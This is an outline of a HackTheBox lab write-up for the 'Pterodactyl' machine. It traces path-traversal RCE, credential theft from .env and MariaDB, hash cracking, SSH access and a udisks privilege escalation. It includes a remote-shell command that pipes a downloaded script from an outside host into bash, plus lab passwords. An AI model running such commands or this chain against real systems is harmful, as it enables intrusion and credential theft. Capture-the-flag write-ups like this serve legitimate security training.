# HackTheBox Pterodactyl Full Chain Penetration Testing
  ## External Reconnaissance and Web Entry
    Vhost Discovery: Gobuster enumeration revealing panel.pterodactyl.htb
    Platform Analysis: Identification of Pterodactyl Panel version 1.11.10
    Vulnerability Assessment: Detection of CVE-2025-49132 (Locale Path Traversal)

## Exploitation and Initial Access
    RCE via Path Traversal: Utilizing a Python exploit targeting the locale parameter to achieve Remote Code Execution
    Reverse Shell: Executing `curl 10.10.14.17/shell.sh | bash` to establish a connection as the `wwwrun` user
    Local Enumeration: Extraction of sensitive credentials (DB, APP_KEY) from the `/var/www/pterodactyl/.env` file
    Credential Recovery and SSH Access
    Database Exfiltration: Accessing MariaDB via `127.0.0.1:3306` using recovered credentials (pterodactyl:PteraPanel)
    User Enumeration: Extracting bcrypt-hashed passwords for accounts headmonitor and phileasfogg3 from the users table

## Credential Cracking and Lateral Movement
    Identifying !QAZ2wsx as the valid password for phileasfogg3, used to connect via ssh
    Establishing an interactive SSH session and retrieving user.txt
## Privilege Escalation and Root Access
    Linux System Enumeration
    Mail Analysis: Discovering a notification in `/var/mail` regarding issues with the udiskd service
    Service Analysis: Identifying that udiskd operates with elevated privileges and relies on the libblockdev library

## Vulnerability Research: Identifying CVE-2025-6019 as a viable escalation path within the storage daemon components
    Root Acquisition (udiskd Exploit)
    Exploit Implementation: Leveraging a PoC script for CVE-2025-6019 targeting the flaw in libblockdev
    Privilege Elevation: Triggering the library flaw to execute code with root permissions
**Current Status**: _Exploitation in progress – identifying path to horizontal/vertical escalation via PrivateBin configurations._
